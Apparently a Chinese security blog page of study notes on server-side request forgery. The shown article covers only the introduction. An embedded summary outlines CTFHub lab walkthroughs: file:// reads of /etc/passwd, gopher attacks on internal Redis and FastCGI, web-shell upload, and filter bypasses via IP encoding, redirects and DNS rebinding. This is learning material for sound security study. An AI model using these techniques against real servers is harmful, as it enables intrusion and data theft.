<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>SSRF | MooSe的小窝</title><meta name="author" content="MooSe"><meta name="copyright" content="MooSe"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#18171d"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="SSRF"><meta name="application-name" content="SSRF"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#18171d"><meta property="og:type" content="article"><meta property="og:title" content="SSRF"><meta property="og:url" content="http://example.com/2024/05/16/SSRF/index.html"><meta property="og:site_name" content="MooSe的小窝"><meta property="og:description" content="SSRF 学习笔记SSRF简介 **服务器请求伪造 **ssrf（service side request forgery)   SSRF是一种由攻击者形成服务器端发起的安全漏洞，本质上属于信息泄露漏洞  SSRF漏洞原理攻击方式:借助主机A来发起SSRF攻击，通过主机A向主机B发起请求，从而获取主"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="https://cdn.jsdelivr.net/gh/MooSeQAQ/tuchuang@main/img/moose.jpg"><meta property="article:author" content="MooSe"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/MooSeQAQ/tuchuang@main/img/moose.jpg"><meta name="description" content="SSRF 学习笔记SSRF简介 **服务器请求伪造 **ssrf（service side request forgery)   SSRF是一种由攻击者形成服务器端发起的安全漏洞，本质上属于信息泄露漏洞  SSRF漏洞原理攻击方式:借助主机A来发起SSRF攻击，通过主机A向主机B发起请求，从而获取主"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="http://example.com/2024/05/16/SSRF/"><link rel="preconnect" href="//cdn.cbd.int"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  linkPageTop: {"enable":"ture","title":"与数百名博主无限进步","addFriendPlaceholder":"昵称（请勿包含博客等字样）：\n网站地址（要求博客地址，请勿提交个人主页）：\n头像图片url（请提供尽可能清晰的图片，我会上传到我自己的图床）：\n描述：\n站点截图（可选）：\n"},
  peoplecanvas: undefined,
  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
  diytitle: {"enable":true,"leaveTitle":"w(ﾟДﾟ)w 不要走！再看看嘛！","backTitle":"♪(^∇^*)欢迎肥来！"},
  LA51: undefined,
  greetingBox: undefined,
  twikooEnvId: '',
  commentBarrageConfig:undefined,
  root: '/',
  preloader: {"source":3},
  friends_vue_info: undefined,
  navMusic: true,
  mainTone: {"mode":"api","api":"https://img2color-go.vercel.app/api?img=","cover_change":true},
  authorStatus: {"skills":["🤖️ 数码科技爱好者","🔍 分享与热心帮助","🏃 脚踏实地行动派","🧱 团队小组发动机"]},
  algolia: undefined,
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: true,
    simplehomepage: false,
    post: true
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: MooSe","link":"链接: ","source":"来源: MooSe的小窝","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false,
  shortcutKey: {"enable":"ture","delay":100,"shiftDelay":200},
  autoDarkmode: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  configTitle: 'MooSe的小窝',
  title: 'SSRF',
  postAI: '',
  pageFillDescription: 'SSRF 学习笔记, SSRF简介, SSRF漏洞原理, SSRF漏洞利用, SSRF中url的伪协议, filex2Fx2F伪协议, filex2Fx2Fx2Fetcx2Fpassword, filex2Fx2Fx2Fetcx2Fx2Fhosts, filex2Fx2Fx2Fprocx2Fnet.arp, filex2Fx2Fx2Fprocx2Fnetx2Ffib_trie, dict伪协议, http伪协议, gopher伪协议, GET提交, 法一：, 法二, POST提交, 法一：, 法二：, 产生SSRF漏洞的函数, 1、file_get_contents, 2、sockopen(), 3、curl_exec(), SSRF绕过方式, 利用进制转换进行绕过, 八进制, 十六进制, 十进制(连续), 302重定向, DNS重绑定绕过, DNS 重绑定攻击的原理, 利用@进行绕过, SSRF靶场, CTFHub, 内网访问, 伪协议读取文件, file伪协议解题, Web目录, 端口扫描, POST请求, 尝试访问127.0.0.1/flag.php, 分别查看index.php和flag.php, 利用gopher伪协议传参, 思考, 文件上传, 尝试访问127.0.0.1/flag.php, 查看flag.php, 编写一个提交按钮, 抓POST的文件上传包, 用gopher伪协议上传POST包, FastCGI协议, Fastcgi协议分析, 解题思路, Redis协议, Redis协议分析, 解题思路, 法一, 法二, 思考, 1.若改用GET传参, 2.不输入Shell内容, 小结, URLBypass, 法一, 补充, 数字IP Bypass, 法一 进制转换, 十进制(连续), 八进制, 十六进制, 302跳转, DNS重绑定, 浅谈DNS重绑定, ps, DNS 重绑定学习笔记简介服务器请求伪造是一种由攻击者形成服务器端发起的安全漏洞本质上属于信息泄露漏洞漏洞原理攻击方式借助主机来发起攻击通过主机向主机发起请求从而获取主机的一些信息利用的是服务端的请求伪造是利用存在缺陷的应用作为代理攻击远程和本地的服务器漏洞利用漏洞利用通过服务器服务器访问所在内网的其他服务器获取信息进而利用实现其他漏洞利用利用协议读取本地文件利用协议读取本地文件对服务器所在内网本地进行端口扫描获取一些服务的信息攻击运行在内网或本地的应用程序攻击内外网的应用主要是使用请求就可以实现的攻击攻击运行在内网或本地的应用程序对内网应用进行指纹识别识别企业内部的资产信息中的伪协议从文件系统中获取文件内容如字典服务协议访问字典资源如可用于网络端口扫描文件传输协议或安全文件传输协议轻量级目录访问协议简单文件传输协议分布式文档传递服务伪协议从文件系统中获取文件内容格式为文件路径读取文件显示当前操作系统网卡的显示缓存表寻找内网其他主机显示当前网段路由信息用来直接读取文件的信息用来查找当前操作系统网段的地址用来查看内网中有哪些主机是存活的优点不管对方主机开没开防火墙都能扫描出来发送请求可以用来检测对方是否开启用进行扫描利用不断发送请求即可扫描出处于运行状态的主机查看当前网段的路由信息伪协议在上面的内容中我们已经使用伪协议扫描出了主机内网的信息那么接下来要想知道对方开了哪些端口就需要用到伪协议注伪协议和伪协议也可以但是耗时比较长即查找内网存活主机查找内网主机开放端口步骤如下抓包随意输入一个端口如用发送请求注意要用集束炸弹因为有两个变量输入常用端口根据判断端口是否打开附若用扫描端口时间过长伪协议作用常规形式允许通过的方法以只读访问文件或资源注中通常用于远程包含用于目录扫描步骤如下用抓包发送到导入字典对其子页面进行爆破扫描字典在中的结果如下即可打开对应的子页面伪协议利用范围较广提交提交其中伪协议能用于提交比较重要因为之前学习的几乎是提交例如伪协议基本格式注也需要加端口号协议默认端口为请求不转发第一个字符因此一般用填充首位在这个子页面下实验使用传参提交提交的原理提交利用进行提交首先抓包将文件头部信息提取出来修改例如这里要打开的是子页面就将改为再将目标地址改上注意千万不要忘了回车换行法一将其进行部分编码后提交注意添加端口号和填充位编码空格问号换行符将构造后的提交即可法二直接将三行文件头部信息全部编码两次抓包将刚才的代码内容复制到文件包末尾连续进行两次编码注意这里要记得写入参数值否则没有结果注意问号需要转码为编码也就是回车换行要变为但如果直接用工具转可能只会有在包的最后要加代表消息结束具体可研究包结束编码改为大写冒号注意英文冒号如果使用发包需要进行两次编码提交最后需要增加一个换行符提交首先与提交的区别需要四个头部信息从文件包中提取这些信息并写成代码以备编码将两次编码后的代码放到格式后面法一将代码进行两次编码然后直接放在后面构造成最后用拦截下来进行提交法二用抓包如何将刚刚构造的代码内容复制到文件末尾进行两次编码即可产生漏洞的函数攻击可能存在任何语言编写的应用接下来将举例中可能存在漏洞的函数下面的代码使用函数从用户指定的获取图片然后把它用一个随即文件名保存在硬盘上并展示给用户以下代码使用函数实现获取用户制定的数据文件或者这个函数会使用跟服务器建立连接传输原始数据这是另一个非常常见的实现它通过获取数据文件数据被下载并存储在文件夹下的磁盘中并附加了一个随机数和文件扩展名注意事项一般情况下不会开启的的协议不能编码关于的跳转会出现导致利用失败上协议存在截断经测试可用默认不跟踪跳转支持协议绕过方式利用进制转换进行绕过利用进制转换进行绕过限制当被限制无法直接访问时可以看到直接访问是行不通的这个时候我们就可以将其进行进制转换原始点分十进制进行进制转换例如八进制或者十六进制或或者十进制连续小结重定向重定向针对私网地址被限制的情况原理构建重定向代码注不能使用尝试用内网失败改用公网成功重绑定绕过这里我们先来提一下针对漏洞的防御解析目标的获取其解析获取指向的地址检查地址是否为内网地址请求如果有跳转拿出跳转执行这些防御可以有效地限制直接访问内网进制转换跳转以及短链接变换等变形畸形攻击因此针对这种防御我们就可以使用重绑定攻击重绑定攻击的原理先来看看的防御模式第一次解析是对的进行解析第二次解析使用发包的时候进行解析利用两次解析的时间差进行绕过攻击原理网站提供为的解析生成解析的域名用生成的域名进行重绑定小结利用进行绕过限制为域名时利用可以尝试采用基本身份认证的方式绕过如在对解析域名中不同的处理函数存在处理差异在的中会识别而则识别为例如原理前面会被解析成用户名后面是访问地址靶场内网访问题目要求访问位于的打开网址一片空白因为还没有输入手敲访问拿到伪协议读取文件题目要求读取目录下的进入题目环境伪协议读取文件于是想到用伪协议伪协议解题起初对目录有误解构造了还有但发现都不行这里请教了一下狗屁通因此应该构造的应为有回显但没有查看源代码看看拿到补充目录假设你要读取服务器上的文件可以从以下路径尝试通过尝试这些路径就可以逐步确定目标目录的具体路径注解是系统中一个常见的目录路径这个路径通常用于存放服务器如或托管的静态文件和动态脚本具体解释如下这个目录用于存放可变数据文件即那些经常发生变化的文件包括系统日志文件包管理系统的缓存临时文件等等这是服务器的默认根目录通常包含服务器可以访问的所有网站文件这是服务器的默认文档根目录通常是存放网站的主要内容包括文件文件文件以及脚本文件等所以这个表示你在本地文件系统中访问位于目录下的文件这通常是一个脚本文件服务器会通过解析这个文件来生成动态网页内容并返回给客户端端口扫描题目要求来来来性感在线扫端口据说端口范围是哦用扫描端口号从到先构造出一个用抓包发送到添加用数值爆破再根据长度找到对应端口即可请求本题考查请求这次是发一个请求对了是用的实现的并且会跟踪跳转加油吧骚年首先访问目标地址发现是空白页面网页导航栏中有的参数信息说明肯定是有信息的尝试访问查看源代码可以发现的值分别查看和可见要上传的值才能拿到想到用伪协议上传传参了当前运行脚本所在的服务器非本地的地址所以在传入值返回可以利用传故用协议在中构造请求包往传值从而获得构造协议所需的请求包必须包含的四个参数的长度利用伪协议传参先随便输入表单值抓包从数据包里提取构造代码构造出将其进行两次编码因为浏览器会自动进行解析且到达目的地之前需要两次解码中转网站解析目标解析在线编码地址在线编码转换和在线互转中文转工具将上面的文本复制到加密选项中加密结果如下将替换成进行第二次编码拿到编码后的伪协议的格式完整的访问完整的最终拿到思考法一将原始进行部分编码法二将原始全部进行编码经过检查区别后没加上空格和的用的是小写这两个不同均不影响的作用真正影响的是没加上应为文件上传题目要求上传一个文件到进入网页为空白尝试访问发现有一个文件上传的地方但是没有提交按钮查看与前一题基本一样查看访问并且查看源代码得到以下代码意思是需要在本地上传一个文件且文件不能为空而且这里缺了一个提交按钮我们直接给他加上编写一个提交按钮发现没有提交按钮没关系直接在网页编写一个按钮打开控制台在元素处直接修改手动加上一个按钮前端网页就会出现按钮现在再提交从刚刚的源码中我们可以知道要从随便上传一个文件就能拿到从别的地址上传还是会弹出像的页面所以不关文件内容的事情我们要让服务端自己发请求这就达到伪造本机地址的目的抓包改为还是不行还是走协议吧抓的文件上传包用按钮提交上传抓包把多余部分删掉就是红字部分将包中的也改成关键点在于这个因为题目不要求上传的文件内容但是要求上传的文件名是用伪协议上传包然后在最初的界面抓包复制刚刚的数据包进行两次编码因为两次编码太长可以第二次用只对特殊字符编码拿到协议这次我们需要攻击一下协议咯也许附件的文章会对你有点帮助题目附件协议分析未授权访问漏洞编写未授权访问博客题解博客中协议协议以及工具攻击协议博客协议协议分析解题思路使用工具工具下载地址从压缩文件打开终端打开协议输入命令再打开文件同时查看目录将得到的结果进行一次编码后放入原网页的处用进行特殊字符部分编码试过全部编码能得到一样的结果只是会比较长建议用编码比较好不知道为什么有时候用其他工具进行编码就得不到结果其实也可以在原网页打开得到文件的文件名然后在终端再使用一次协议这次要读取文件先打开读取文件或者可以用如果说有过滤的话将这次得到的结果进行一次编码再将编码后的放到原网页的后面拿到协议这次来攻击协议吧资料没有资料自己找协议分析什么是协议协议也被称为它是一种简单的文本协议用于在客户端和服务器之间操作和传输数据可以说是最简单的一种传输协议解题思路首先访问环境使用工具来生成输入命令这里我们使用并且使用默认路径生成代码的文件名为直接输入得到生成的将其进行一次编码随后放入原网页的处按理说原网页会显示但是这里死活不行后来换浏览器就可以了再访问成功访问说明文件成功上传了法一下面我们就可以读取先尝试这里测试了很久都打不开后来发现因为上传的是传参所以在处不行是于是用进行传参试试这里由于用的是而不是而命令不是代码所以要用到函数把用函数括起来即可成功执行命令拿到文件名下面再读取执行命令成功拿到法二那么成功上传之后我们其实可以直接连接蚁剑了失败了好几次后来才发现是因为复制的时候多复制了一个进入蚁剑访问点开可以看到我们刚刚上传上去的木马找啊找在根目录里找到文件顺利拿到思考若改用传参那么是不是就可以直接在处不输入内容即不输入直接发现这样得到的代码其实本身就是传参把这段代码进行一次编码后放到原网页处上传成功经过测试果然这样通过传参就可以直接在处综上直接得到的代码其实就是的编码默认为传参且键值对的键为小结第一行这里我们填写因为我们需要的是第二行可以不填默认根路径为第三行就写入我们的代码所以说其实用传参和用传参都可以若用传参那么可以用传命令也可以直接用蚁剑连接毕竟已经上传了若用传参直接在处和就好了将编码后的代码放到原网页的处只要能成功上传文件都可以用蚁剑连接请求的中必须包含来尝试利用的一些特殊地方绕过这个限制吧法一利用构造原理前面会被解析成用户名后面是访问地址语法规定补充绕过的方法攻击本地利用不加端口的话是利用这里就是在指定的网址后加利用短域名利用特殊域名原理是解析利用解析在域名上设置记录指向利用上传修改为比如上传图片处修改上传将图片文件修改为即可能触发利用句号进行进制转换可以是十六进制八进制等首先把这四段数字给分别转成进制结果然后把这十六进制一起转换成进制记得访问的时候加表示使用八进制可以是一个也可以是多个跟中多加几个来绕过过滤一样十六进制加利用特殊地址数字这次掉了以及不能使用点分十进制的了但是又要访问该怎么办呢根据题目意思掉了和不能使用点分十进制访问那么我们就考虑用进制转换法一进制转换十进制连续八进制或者不行十六进制或不行或不行跳转中有个很重要的一点是请求可能会跟随跳转尝试利用这个来绕过对的检测访问到位于的吧查看网页源代码限制了可用代替重绑定关键词重绑定剩下的自己来吧也许附件中的链接能有些帮助浅谈重绑定浅谈重绑定漏洞知乎进入环境尝试访问通过协议查看网页源代码跟上一题一样的黑名单还是掉了试了一下用代替就拿到了不过题目要求以重绑定的方式绕过重绑定通过网站设置使用生成的域名构造成功拿到同样也可以',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-07-08 15:31:30',
  postMainColor: '',
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
        }
      }
      const t = saveToLocal.get('theme')
    
          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

          if (t === undefined) {
            if (isLightMode) activateLightMode()
            else if (isDarkMode) activateDarkMode()
            else if (isNotSpecified || hasNoSupport) {
              const now = new Date()
              const hour = now.getHours()
              const isNight = hour <= 6 || hour >= 18
              isNight ? activateDarkMode() : activateLightMode()
            }
            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.3.0"></head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://cdn.jsdelivr.net/gh/MooSeQAQ/tuchuang@main/img/studyinging.jpg"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
  endLoading: () => {
    document.getElementById('loading-box').classList.add("loaded");
  },
  initLoading: () => {
    document.getElementById('loading-box').classList.remove("loaded")
  }
}
window.addEventListener('load',()=> { preloader.endLoading() })
setTimeout(function(){preloader.endLoading();},10000)

if (true) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><a id="site-name" href="/" accesskey="h"><div class="title">MooSe的小窝</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 隧道</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><i class="anzhiyufont anzhiyu-icon-link faa-tada" style="font-size: 0.9em;"></i><span> 友人帐</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 留言板</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/comments/"><i class="anzhiyufont anzhiyu-icon-envelope faa-tada" style="font-size: 0.9em;"></i><span> 留言板</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 随便逛逛</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><i class="anzhiyufont anzhiyu-icon-shoe-prints1 faa-tada" style="font-size: 0.9em;"></i><span> 随便逛逛</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" alt="微信" src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/Linux/" style="font-size: 1.05rem;">Linux<sup>1</sup></a><a href="/tags/%E5%89%8D%E7%AB%AF/" style="font-size: 1.05rem;">前端<sup>2</sup></a><a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" style="font-size: 1.05rem;">数据库<sup>1</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/07/"><span class="card-archive-list-date">七月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/05/"><span class="card-archive-list-date">五月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/04/"><span class="card-archive-list-date">四月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">3</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/03/"><span class="card-archive-list-date">三月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">8</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div><div class="console-btn-item" id="consoleMusic" onclick="anzhiyu.musicToggle()" title="音乐开关"><a class="music-switch"><i class="anzhiyufont anzhiyu-icon-music"></i></a></div><div class="console-btn-item" id="consoleKeyboard" onclick="anzhiyu.keyboardToggle()" title="快捷键开关"><a class="keyboard-switch"><i class="anzhiyufont anzhiyu-icon-keyboard"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="article-meta tags"></span></div></div><h1 class="post-title" itemprop="name headline">SSRF</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2024-05-16T07:29:34.000Z" title="发表于 2024-05-16 15:29:34">2024-05-16</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2024-07-08T07:31:30.955Z" title="更新于 2024-07-08 15:31:30">2024-07-08</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-pv-cv" id="" data-flag-title="SSRF"><i class="anzhiyufont anzhiyu-icon-fw-eye post-meta-icon"></i><span class="post-meta-label" title="阅读量">阅读量:</span><span id="busuanzi_value_page_pv"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></span><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为浙江"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>浙江</span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src=""></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="http://example.com/2024/05/16/SSRF/"><header><h1 id="CrawlerTitle" itemprop="name headline">SSRF</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">MooSe</span><time itemprop="dateCreated datePublished" datetime="2024-05-16T07:29:34.000Z" title="发表于 2024-05-16 15:29:34">2024-05-16</time><time itemprop="dateCreated datePublished" datetime="2024-07-08T07:31:30.955Z" title="更新于 2024-07-08 15:31:30">2024-07-08</time></header><h1 id="SSRF-学习笔记"><a href="#SSRF-学习笔记" class="headerlink" title="SSRF 学习笔记"></a>SSRF 学习笔记</h1><h2 id="SSRF简介"><a href="#SSRF简介" class="headerlink" title="SSRF简介"></a>SSRF简介</h2><ul>
<li>**服务器请求伪造 **ssrf（service side request forgery)</li>
</ul>
<blockquote>
<p>SSRF是一种由攻击者形成服务器端发起的安全漏洞，本质上属于信息泄露漏洞</p>
</blockquote>
<h3 id="SSRF漏洞原理"><a href="#SSRF漏洞原理" class="headerlink" title="SSRF漏洞原理"></a>SSRF漏洞原理</h3><p><strong>攻击方式</strong>:借助主机A来发起<strong>SSRF</strong>攻击，通过主机A向主机B发起请求，从而获取主机B的一些信息。</p>
<blockquote>
<p>利用的是服务端的请求伪造:ssrf是利用存在缺陷的web应用作为代理攻击远程和本地的服务器</p>
</blockquote>
